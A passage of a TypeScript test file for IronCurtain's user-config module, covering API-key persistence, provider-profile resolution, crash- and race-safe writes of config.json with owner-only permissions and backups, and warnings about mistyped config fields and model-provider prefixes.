    writeConfigFile({ modelProviders: { profiles: { p: { type: 'openrouter', apiKey: 'sk-or-v1-file' } } } });
    process.env.OPENROUTER_API_KEY = 'sk-or-v1-from-env';
    // A save that carries the env-injected key (as the resolved editor value would).
    saveUserConfig({ modelProviders: { profiles: { p: { type: 'openrouter', apiKey: 'sk-or-v1-from-env' } } } });
    const written = JSON.parse(readFileSync(resolve(testHome, 'config.json'), 'utf-8'));
    expect(written.modelProviders.profiles.p.apiKey).toBe('sk-or-v1-file');
  });

  it('persists a user-typed key that differs from the env value', () => {
    process.env.OPENROUTER_API_KEY = 'sk-or-v1-from-env';
    saveUserConfig({ modelProviders: { profiles: { p: { type: 'openrouter', apiKey: 'sk-or-v1-typed' } } } });
    const written = JSON.parse(readFileSync(resolve(testHome, 'config.json'), 'utf-8'));
    expect(written.modelProviders.profiles.p.apiKey).toBe('sk-or-v1-typed');
  });
});

describe('resolveActiveProfile (pure resolver)', () => {
  const modelProviders = {
    default: 'glm-5.2',
    profiles: {
      native: { type: 'native' as const },
      'glm-5.2': {
        type: 'openrouter' as const,
        apiKey: 'sk-or-v1-x',
        modelMap: DEFAULT_MODEL_MAP,
        usesDefaultMap: false,
        perAgent: { 'claude-code': undefined, goose: undefined, codex: undefined },
        providerPreference: undefined,
        sessionAffinity: true,
      },
      kimi: {
        type: 'openrouter' as const,
        apiKey: '',
        modelMap: [{ match: '*', model: 'moonshot/kimi-k3' }],
        usesDefaultMap: false,
        perAgent: { 'claude-code': undefined, goose: undefined, codex: undefined },
        providerPreference: undefined,
        sessionAffinity: true,
      },
    },
  };

  it('returns the explicitly named profile', () => {
    const profile = resolveActiveProfile(modelProviders, 'kimi');
    expect(profile).toBe(modelProviders.profiles.kimi);
  });

  it('falls back to modelProviders.default when no name is given', () => {
    const profile = resolveActiveProfile(modelProviders, undefined);
    expect(profile).toBe(modelProviders.profiles['glm-5.2']);
  });

  it('falls back to native when default is native and no name is given', () => {
    const nativeOnly = { default: 'native', profiles: { native: { type: 'native' as const } } };
    expect(resolveActiveProfile(nativeOnly, undefined)).toEqual({ type: 'native' });
  });

  it('resolves an explicit "native" name', () => {
    expect(resolveActiveProfile(modelProviders, 'native')).toEqual({ type: 'native' });
  });

  it('throws a clear error listing available profiles for an unknown name', () => {
    expect(() => resolveActiveProfile(modelProviders, 'does-not-exist')).toThrow(
      'Unknown provider profile "does-not-exist". Available: native, glm-5.2, kimi.',
    );
  });

  it('defaults Opus to GLM 5.3 and Sonnet/Haiku to GLM 5.3 Flash', () => {
    expect(DEFAULT_GLM_SLUG).toBe('z-ai/glm-5.3');
    expect(DEFAULT_GLM_FLASH_SLUG).toBe('z-ai/glm-5.3-flash');
    expect(DEFAULT_MODEL_MAP).toEqual([
      { match: '*opus*', model: 'z-ai/glm-5.3' },
      { match: '*sonnet*', model: 'z-ai/glm-5.3-flash' },
      { match: '*haiku*', model: 'z-ai/glm-5.3-flash' },
    ]);
  });
});

// ── config.json integrity: refuse corrupt bases, atomic private writes, one writer at a time ──

describe('config.json write integrity', () => {
  let testHome: string;
  let configPath: string;
  const savedEnv: Record<string, string | undefined> = {};

  /** A config with a JSON typo (trailing comma) that still holds secrets. */
  const TYPO_CONFIG = [
    '{',
    '  "anthropicApiKey": "sk-ant-api03-keep-me",',
    '  "serverCredentials": { "github": { "GITHUB_PERSONAL_ACCESS_TOKEN": "ghp_keep_me" } },',
    '  "signal": { "botNumber": "+15550001111", "recipientNumber": "+15550002222", "recipientIdentityKey": "05abc" },',
    '}',
    '',
  ].join('\n');

  beforeEach(() => {
    testHome = mkdtempSync(resolve(tmpdir(), 'ironcurtain-config-integrity-'));
    configPath = resolve(testHome, 'config.json');
    for (const key of ENV_VARS_TO_ISOLATE) {
      savedEnv[key] = process.env[key];
      delete process.env[key];
    }
    process.env.IRONCURTAIN_HOME = testHome;
  });

  afterEach(() => {
    for (const key of ENV_VARS_TO_ISOLATE) {
      if (savedEnv[key] !== undefined) {
        process.env[key] = savedEnv[key];
      } else {
        delete process.env[key];
      }
    }
    rmSync(testHome, { recursive: true, force: true });
  });

  function withUmask<T>(mask: number, fn: () => T): T {
    const previous = process.umask(mask);
    try {
      return fn();
    } finally {
      process.umask(previous);
    }
  }

  function modeOf(path: string): number {
    return statSync(path).mode & 0o777;
  }

  describe('a config.json that does not parse', () => {
    beforeEach(() => {
      writeFileSync(configPath, TYPO_CONFIG, { mode: 0o600 });
    });

    it('is not overwritten by a save (the web UI statistics toggle)', () => {
      expect(() => saveUserConfig({ statistics: { enabled: false, retentionDays: 30 } })).toThrow(
        /Invalid JSON in .*config\.json.*Nothing was saved/,
      );
      expect(readFileSync(configPath, 'utf-8')).toBe(TYPO_CONFIG);
      expect(readdirSync(testHome)).toEqual(['config.json']);
    });

    it("is not overwritten by setup-signal's save of the Signal section", () => {
      expect(() =>
        saveUserConfig({
          signal: { botNumber: '+15550003333', recipientNumber: '+15550004444', recipientIdentityKey: '05new' },
        }),
      ).toThrow(/Invalid JSON/);
      expect(readFileSync(configPath, 'utf-8')).toBe(TYPO_CONFIG);
      expect(readdirSync(testHome)).toEqual(['config.json']);
    });

    it('is left alone by a normal load too', () => {
      expect(() => loadUserConfig()).toThrow(/Invalid JSON/);
      expect(readFileSync(configPath, 'utf-8')).toBe(TYPO_CONFIG);
    });
  });

  it.each([
    ['an array', '[]'],
    ['null', 'null'],
    ['a string', '"text"'],
    ['an empty file', ''],
  ])('refuses to save over %s', (_label, content) => {
    writeFileSync(configPath, content);
    expect(() => saveUserConfig({ statistics: { enabled: false, retentionDays: 30 } })).toThrow(
      /Invalid (JSON|config)/,
    );
    expect(readFileSync(configPath, 'utf-8')).toBe(content);
  });

  it('keeps the replaced version as config.json.bak, owner-only', () => {
    saveUserConfig({ anthropicApiKey: 'sk-ant-first' });
    const first = readFileSync(configPath, 'utf-8');
    saveUserConfig({ statistics: { enabled: false, retentionDays: 30 } });

    const backupPath = `${configPath}.bak`;
    expect(readFileSync(backupPath, 'utf-8')).toBe(first);
    expect(modeOf(backupPath)).toBe(0o600);
    expect(JSON.parse(readFileSync(configPath, 'utf-8'))).toMatchObject({
      anthropicApiKey: 'sk-ant-first',
      statistics: { enabled: false, retentionDays: 30 },
    });
  });

  it('does not replace the backup with an identical copy when a save changes nothing', () => {
    saveUserConfig({ agentModelId: 'anthropic:claude-opus-4-6' });
    const first = readFileSync(configPath, 'utf-8');
    saveUserConfig({ agentModelId: 'anthropic:claude-sonnet-4-6' });
    saveUserConfig({ agentModelId: 'anthropic:claude-sonnet-4-6' });

    expect(readFileSync(`${configPath}.bak`, 'utf-8')).toBe(first);
  });

  it('writes config.json and its backup owner-only under umask 002', () => {
    writeFileSync(configPath, JSON.stringify({ agentModelId: 'anthropic:claude-sonnet-4-6' }), { mode: 0o664 });

    withUmask(0o002, () => saveUserConfig({ anthropicApiKey: 'sk-ant-secret' }));

    expect(modeOf(configPath)).toBe(0o600);
    expect(modeOf(`${configPath}.bak`)).toBe(0o600);
    expect(readdirSync(testHome).sort()).toEqual(['config.json', 'config.json.bak']);
  });

  it('creates and backfills the default config owner-only under umask 002', () => {
    const stderrSpy = vi.spyOn(process.stderr, 'write').mockReturnValue(true);
    try {
      withUmask(0o002, () => loadUserConfig());
      expect(modeOf(configPath)).toBe(0o600);

      rmSync(configPath);
      writeFileSync(configPath, JSON.stringify({ agentModelId: 'anthropic:claude-sonnet-4-6' }), { mode: 0o600 });
      withUmask(0o002, () => loadUserConfig());
    } finally {
      stderrSpy.mockRestore();
    }
    expect(modeOf(configPath)).toBe(0o600);
    expect(modeOf(`${configPath}.bak`)).toBe(0o600);
  });

  it('keeps a symlinked config.json (dotfile manager) a symlink across saves and backfills', () => {
    const dotfiles = resolve(testHome, 'dotfiles');
    mkdirSync(dotfiles);
    const real = resolve(dotfiles, 'ironcurtain.json');
    writeFileSync(real, JSON.stringify({ agentModelId: 'anthropic:claude-sonnet-4-6' }), { mode: 0o644 });
    symlinkSync(real, configPath);

    const stderrSpy = vi.spyOn(process.stderr, 'write').mockReturnValue(true);
    try {
      loadUserConfig();
    } finally {
      stderrSpy.mockRestore();
    }
    saveUserConfig({ anthropicApiKey: 'sk-ant-secret' });

    expect(lstatSync(configPath).isSymbolicLink()).toBe(true);
    expect(JSON.parse(readFileSync(real, 'utf-8'))).toMatchObject({
      agentModelId: 'anthropic:claude-sonnet-4-6',
      anthropicApiKey: 'sk-ant-secret',
      statistics: USER_CONFIG_DEFAULTS.statistics,
    });
    expect(modeOf(real)).toBe(0o600);
    // The backup stays in the IronCurtain home, not in the dotfiles directory.
    expect(readdirSync(dotfiles)).toEqual(['ironcurtain.json']);
    expect(lstatSync(`${configPath}.bak`).isFile()).toBe(true);
  });

  describe('across processes', () => {
    function waitForFile(path: string, timeoutMs: number): Promise<void> {
      const deadline = Date.now() + timeoutMs;
      return new Promise((resolvePromise, rejectPromise) => {
        const poll = (): void => {
          if (existsSync(path)) resolvePromise();
          else if (Date.now() > deadline) rejectPromise(new Error(`timed out waiting for ${path}`));
          else setTimeout(poll, 10);
        };
        poll();
      });
    }

    /** Runs an ES module program under tsx; resolves on exit 0. */
    function runProgram(program: string, args: string[]): Promise<void> {
      return new Promise((resolvePromise, rejectPromise) => {
        const child = spawn(process.execPath, ['--import', 'tsx', '--input-type=module', '--eval', program, ...args], {
          cwd: process.cwd(),
          env: { ...process.env, IRONCURTAIN_HOME: testHome },
          stdio: ['ignore', 'ignore', 'pipe'],
        });
        let stderr = '';
        child.stderr.setEncoding('utf8').on('data', (chunk: string) => {
          stderr += chunk;
        });
        child.once('error', rejectPromise);
        child.once('exit', (code) => {
          if (code === 0) resolvePromise();
          else rejectPromise(new Error(`child exited ${String(code)}: ${stderr}`));
        });
      });
    }

    it('concurrent saves from several processes lose no update', async () => {
      writeFileSync(configPath, JSON.stringify({ anthropicApiKey: 'sk-ant-base' }, null, 2), { mode: 0o600 });
      const moduleUrl = pathToFileURL(resolve(process.cwd(), 'src', 'config', 'user-config.ts')).href;
      const program = `
        import { existsSync, writeFileSync } from 'node:fs';
        import { saveUserConfig } from ${JSON.stringify(moduleUrl)};
        const [readyPath, goPath, writer, count] = process.argv.slice(1);
        writeFileSync(readyPath, '');
        while (!existsSync(goPath)) await new Promise((r) => setTimeout(r, 2));
        for (let i = 0; i < Number(count); i++) {
          saveUserConfig({ serverCredentials: { ['w' + writer + '-' + i]: { TOKEN: 'v' + writer + '-' + i } } });
        }
      `;
      const writers = 4;
      const savesEach = 12;
      const signals = mkdtempSync(resolve(tmpdir(), 'ironcurtain-config-race-'));
      try {
        const goPath = resolve(signals, 'go');
        const children = Array.from({ length: writers }, (_, writer) =>
          runProgram(program, [resolve(signals, `ready-${writer}`), goPath, String(writer), String(savesEach)]),
        );
        await Promise.all(
          Array.from({ length: writers }, (_, writer) => waitForFile(resolve(signals, `ready-${writer}`), 60_000)),
        );
        writeFileSync(goPath, '');
        await Promise.all(children);
      } finally {
        rmSync(signals, { recursive: true, force: true });
      }

      const onDisk = JSON.parse(readFileSync(configPath, 'utf-8')) as {
        anthropicApiKey: string;
        serverCredentials: Record<string, { TOKEN: string }>;
      };
      expect(onDisk.anthropicApiKey).toBe('sk-ant-base');
      const expected: Record<string, { TOKEN: string }> = {};
      for (let writer = 0; writer < writers; writer++) {
        for (let i = 0; i < savesEach; i++) expected[`w${writer}-${i}`] = { TOKEN: `v${writer}-${i}` };
      }
      expect(onDisk.serverCredentials).toEqual(expected);
      expect(modeOf(configPath)).toBe(0o600);
      expect(readdirSync(testHome).sort()).toEqual(['config.json', 'config.json.bak']);
    }, 120_000);

    it('a backfilling load does not roll back a save another process made while it waited', async () => {
      writeFileSync(configPath, JSON.stringify({ agentModelId: 'anthropic:claude-sonnet-4-6' }, null, 2), {
        mode: 0o600,
      });
      const savedByOther = `${JSON.stringify(
        {
          agentModelId: 'anthropic:claude-sonnet-4-6',
          serverCredentials: { github: { GITHUB_PERSONAL_ACCESS_TOKEN: 'ghp_saved_meanwhile' } },
        },
        null,
        2,
      )}\n`;
      const lockUrl = pathToFileURL(resolve(process.cwd(), 'src', 'util', 'file-lock.ts')).href;
      // Holds the config lock, then writes a "save" while this process's load waits for the lock.
      const program = `
        import { writeFileSync } from 'node:fs';
        import { withFileLockSync } from ${JSON.stringify(lockUrl)};
        const [configPath, lockedPath, holdMs, content] = process.argv.slice(1);
        withFileLockSync(configPath, () => {
          writeFileSync(lockedPath, '');
          Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, Number(holdMs));
          writeFileSync(configPath, content);
        });
      `;
      const lockedPath = resolve(testHome, '..', `${basename(testHome)}-locked`);
      try {
        const holder = runProgram(program, [configPath, lockedPath, '1500', savedByOther]);
        await waitForFile(lockedPath, 60_000);

        const stderrSpy = vi.spyOn(process.stderr, 'write').mockReturnValue(true);
        let loaded: ReturnType<typeof loadUserConfig>;
        try {
          // Reads the file without the save, then waits for the lock to backfill.
          loaded = loadUserConfig();
        } finally {
          stderrSpy.mockRestore();
        }
        await holder;

        expect(loaded.serverCredentials).toEqual({ github: { GITHUB_PERSONAL_ACCESS_TOKEN: 'ghp_saved_meanwhile' } });
        expect(JSON.parse(readFileSync(configPath, 'utf-8'))).toMatchObject({
          serverCredentials: { github: { GITHUB_PERSONAL_ACCESS_TOKEN: 'ghp_saved_meanwhile' } },
          statistics: USER_CONFIG_DEFAULTS.statistics,
        });
        expect(readFileSync(`${configPath}.bak`, 'utf-8')).toBe(savedByOther);
      } finally {
        rmSync(lockedPath, { force: true });
      }
    }, 60_000);
  });
});

// --- Unknown nested config fields are reported, in every load mode ---

describe('unknown config fields at any depth', () => {
  let testHome: string;
  const savedEnv: Record<string, string | undefined> = {};

  beforeEach(() => {
    testHome = mkdtempSync(resolve(tmpdir(), 'ironcurtain-unknownfields-'));
    for (const key of ENV_VARS_TO_ISOLATE) {
      savedEnv[key] = process.env[key];
      delete process.env[key];
    }
    process.env.IRONCURTAIN_HOME = testHome;
  });

  afterEach(() => {
    for (const key of ENV_VARS_TO_ISOLATE) {
      if (savedEnv[key] !== undefined) process.env[key] = savedEnv[key];
      else delete process.env[key];
    }
    rmSync(testHome, { recursive: true, force: true });
  });

  function writeConfig(config: Record<string, unknown>): void {
    writeFileSync(resolve(testHome, 'config.json'), JSON.stringify(config, null, 2) + '\n', { mode: 0o600 });
  }

  /** Runs `fn` and returns everything it wrote to stderr. */
  function stderrOf(fn: () => unknown): string {
    const writes: string[] = [];
    const spy = vi.spyOn(process.stderr, 'write').mockImplementation((chunk: string | Uint8Array) => {
      writes.push(String(chunk));
      return true;
    });
    try {
      fn();
    } finally {
      spy.mockRestore();
    }
    return writes.join('');
  }

  // Regression: nested z.object() sections strip unknown keys, and only
  // top-level keys were checked (and only in the default load mode), so a
  // $0.50 / 5-step budget typo silently ran with the $5 / 200-step defaults.
  it('warns about a resourceBudget typo and names the field it meant', () => {
    writeConfig({ resourceBudget: { maxCostUsd: 0.5, maxStep: 5 }, dockerResources: { memoryMB: 2048 } });

    let config: ReturnType<typeof loadUserConfig> | undefined;
    const stderr = stderrOf(() => {
      config = loadUserConfig();
    });

    expect(stderr).toContain('unknown field "resourceBudget.maxStep"');
    expect(stderr).toContain('did you mean "resourceBudget.maxSteps"?');
    expect(stderr).toContain('unknown field "resourceBudget.maxCostUsd"');
    expect(stderr).toContain('unknown field "dockerResources.memoryMB"');
    expect(stderr).toContain('did you mean "dockerResources.memoryMb"?');
    // Still a warning, not an error: the defaults apply and the typos stay in the file.
    expect(config?.resourceBudget.maxSteps).toBe(USER_CONFIG_DEFAULTS.resourceBudget.maxSteps);
    const onDisk = JSON.parse(readFileSync(resolve(testHome, 'config.json'), 'utf-8')) as {
      resourceBudget: Record<string, unknown>;
    };
    expect(onDisk.resourceBudget.maxStep).toBe(5);
  });

  it('says so when the backfill fills a section none of whose keys was recognized', () => {
    writeConfig({ resourceBudget: { maxCostUsd: 0.5, maxStep: 5 } });

    const stderr = stderrOf(() => loadUserConfig());

    expect(stderr).toMatch(
      /Backfilled config fields: [^\n]*resourceBudget \(none of its keys is recognized: "maxCostUsd", "maxStep"\)/,
    );
  });

  it('warns in read-only loads too, which never backfill', () => {
    writeConfig({ resourceBudget: { maxStep: 5 } });

    const stderr = stderrOf(() => loadUserConfig({ readOnly: true }));

    expect(stderr).toContain('unknown field "resourceBudget.maxStep"');
    expect(stderr).not.toContain('Backfilled');
  });

  // Workflows take their per-run limits from this loader, not loadUserConfig,
  // so a typo there must be reported on this path as well.
  it('warns from the per-run budget loader, which drops the mistyped limits', () => {
    writeConfig({ resourceBudget: { maxCostUsd: 0.5, maxStep: 5 } });

    let requested: ReturnType<typeof loadRequestedResourceBudgetConfig> | undefined;
    const stderr = stderrOf(() => {
      requested = loadRequestedResourceBudgetConfig();
    });

    expect(stderr).toContain('unknown field "resourceBudget.maxStep"');
    expect(stderr).toContain('did you mean "resourceBudget.maxSteps"?');
    expect(stderr).toContain('unknown field "resourceBudget.maxCostUsd"');
    expect(requested).toEqual({});
  });

  // `setup-signal` reads the saved container block without a full load, so a
  // mistyped key there must be reported on that path as well.
  it('warns from the saved Signal container loader', () => {
    writeConfig({ signal: { container: { prot: 18081 } } });

    let saved: ReturnType<typeof loadSavedSignalContainerConfig>;
    const stderr = stderrOf(() => {
      saved = loadSavedSignalContainerConfig();
    });

    expect(stderr).toContain('unknown field "signal.container.prot"');
    expect(stderr).toContain('did you mean "signal.container.port"?');
    expect(saved).toEqual({});
  });

  it('reports each unknown field once per process, however often the config is loaded', () => {
    writeConfig({ autoCompact: { enabld: false } });

    const first = stderrOf(() => loadUserConfig({ readOnly: true }));
    const again = stderrOf(() => {
      loadUserConfig({ readOnly: true });
      loadUserConfig();
    });

    expect(first).toContain('unknown field "autoCompact.enabld" in');
    expect(first).toContain('did you mean "autoCompact.enabled"?');
    expect(again).not.toContain('autoCompact.enabld');
  });

  it('reaches into provider profiles, model maps and other nested sections', () => {
    const fields = findUnknownUserConfigFields({
      modelProviders: {
        profiles: {
          'glm-5.2': {
            type: 'openrouter',
            apikey: 'sk-or-v1-x',
            modelMap: [{ match: '*sonnet*', modle: 'z-ai/glm-5.3' }],
            perAgent: { 'claude-code': 'z-ai/glm-5.3', cluade: 'x' },
          },
        },
      },
      signal: { container: { prot: 18080 } },
      resourceBudget: { modelPricing: { 'claude-x': { inputPerMillion: 1, outputPerMillion: 2 } } },
      topLevelTypo: true,
    });

    expect(fields).toEqual([
      { field: 'modelProviders.profiles["glm-5.2"].apikey', suggestion: 'modelProviders.profiles["glm-5.2"].apiKey' },
      {
        field: 'modelProviders.profiles["glm-5.2"].modelMap[0].modle',
        suggestion: 'modelProviders.profiles["glm-5.2"].modelMap[0].model',
      },
      { field: 'modelProviders.profiles["glm-5.2"].perAgent.cluade' },
      { field: 'signal.container.prot', suggestion: 'signal.container.port' },
      { field: 'topLevelTypo' },
    ]);
  });

  it('does not flag the keys of free-form records or a complete, valid config', () => {
    const valid = {
      agentModelId: USER_CONFIG_DEFAULTS.agentModelId,
      resourceBudget: {
        ...USER_CONFIG_DEFAULTS.resourceBudget,
        modelPricing: { 'anthropic:claude-x': { inputPerMillion: 3, outputPerMillion: 15, cacheReadPerMillion: 0.3 } },
      },
      autoCompact: USER_CONFIG_DEFAULTS.autoCompact,
      autoApprove: USER_CONFIG_DEFAULTS.autoApprove,
      auditRedaction: USER_CONFIG_DEFAULTS.auditRedaction,
      dockerResources: USER_CONFIG_DEFAULTS.dockerResources,
      snapshot: USER_CONFIG_DEFAULTS.snapshot,
      statistics: USER_CONFIG_DEFAULTS.statistics,
      preferredMode: 'docker',
      serverCredentials: { github: { GITHUB_PERSONAL_ACCESS_TOKEN: 'ghp_x' }, anything: { ANY_NAME: 'v' } },
      webSearch: { provider: 'brave', brave: { apiKey: 'k' } },
      hostModelProfiles: { agent: 'native' },
      modelProviders: {
        default: 'glm',
        profiles: {
          glm: { type: 'openrouter', modelMap: [{ match: '*', model: 'z-ai/glm-5.3' }], sessionAffinity: true },
          zai: { type: 'zai', plan: 'coding', model: 'glm-5.3' },
        },
      },
      credentialProtection: { extraPaths: ['~/.secret'], disabledStores: [] },
      packageInstall: { enabled: true, allowedPackages: ['left-pad'] },
      fetch: { allowPrivateNetworks: false },
      capture: { enabled: false },
      memory: { enabled: true, autoSave: false, llmBaseUrl: 'https://llm.example.com/v1', llmApiKey: 'k' },
      observability: { llmInteractionLog: 'metadata' },
      taintEscalation: { enabled: true, tools: { 'github/*': 'sink', 'fetch/http_fetch': 'source' } },
      contentAssessment: { enabled: true, llmCheck: true, llmModelId: 'anthropic:claude-haiku-4-5' },
      policy: { onStale: 'refuse' },
      egressPolicy: { enabled: true, allowedHosts: ['*.example.com'] },
      cron: { maxConcurrentRuns: 2, catchUpMissedRuns: true },
      maxConcurrentAgentSessions: 2,
    };
    expect(userConfigSchema.safeParse(valid).success).toBe(true);
    expect(findUnknownUserConfigFields(valid)).toEqual([]);
  });

  it('recognizes every field the backfill writes', () => {
    expect(findUnknownUserConfigFields(USER_CONFIG_DEFAULTS)).toEqual([]);
  });
});

// --- Model IDs: near-miss provider prefixes are refused ---

describe('model ID provider near misses', () => {
  // Regression: the loose validator (workflow YAML) accepted "opnai:gpt-5" and
  // routed it to Anthropic as an opaque model name.
  it.each(['anthropc:claude-x', 'opnai:gpt-5', 'opneai:gpt-5', 'gogle:gemini-2.5-flash', 'Anthropic:claude-x'])(
    'rejects %s in workflow (loose) and config (strict) validation, naming the provider',
    (id) => {
      const loose = looseModelId.safeParse(id);
      expect(loose.success).toBe(false);
      expect(loose.error?.issues[0]?.message).toMatch(/did you mean "(anthropic|openai|google)"\?/);
      expect(qualifiedModelId.safeParse(id).success).toBe(false);
      expect(validateWorkflowModelId(id)).toMatch(/Unknown model provider/);
    },
  );

  it('suggests the provider the prefix is closest to', () => {
    expect(validateWorkflowModelId('anthropc:claude-x')).toContain('did you mean "anthropic"?');
    expect(validateModelId('opnai:gpt-5')).toContain('did you mean "openai"?');
  });

  it('still accepts Ollama-style name:tag IDs and other unknown prefixes in workflows', () => {
    for (const id of ['glm-5.1:cloud', 'qwen3.5-uncensored:35b', 'llama3:8b', 'gemma2:2b', 'unknown:model-id']) {
      expect(looseModelId.safeParse(id).success, id).toBe(true);
      expect(validateWorkflowModelId(id), id).toBeUndefined();
    }
    expect(validateWorkflowModelId('openai:gpt-5')).toBeUndefined();
    expect(validateWorkflowModelId(':tag')).toBeDefined();
  });
});
